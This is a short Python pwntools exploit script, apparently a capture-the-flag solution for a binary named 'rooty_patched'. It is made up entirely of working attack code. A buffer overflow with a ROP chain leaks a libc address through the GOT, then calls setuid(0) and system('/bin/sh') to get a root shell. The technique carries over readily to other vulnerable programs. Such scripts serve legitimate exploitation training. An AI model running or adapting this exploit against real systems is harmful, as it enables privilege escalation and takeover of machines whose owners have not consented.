from pwn import *

context.binary = binary = './rooty_patched'

elf = ELF(binary)
rop = ROP(elf)

libc = elf.libc

# p = remote("127.0.0.1", 9901)
p = process()

padding = b'A'*136

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)
payload += p64(elf.got.printf)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.check_password)

p.recvuntil(b'You: ')
p.sendline(b'root')
p.recvuntil(b'pass:')
p.sendline(payload)

# p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8,b'\0'))
log.info(f'Puts leak => {hex(leak)}')
libc.address = leak - libc.symbols.printf
log.info(f'Libc base => {hex(libc.address)}')

payload = padding

payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(0x0)
payload += p64(libc.symbols.setuid)
payload += p64(rop.find_gadget(['ret'])[0])

payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
p.sendline(payload)

p.interactive()


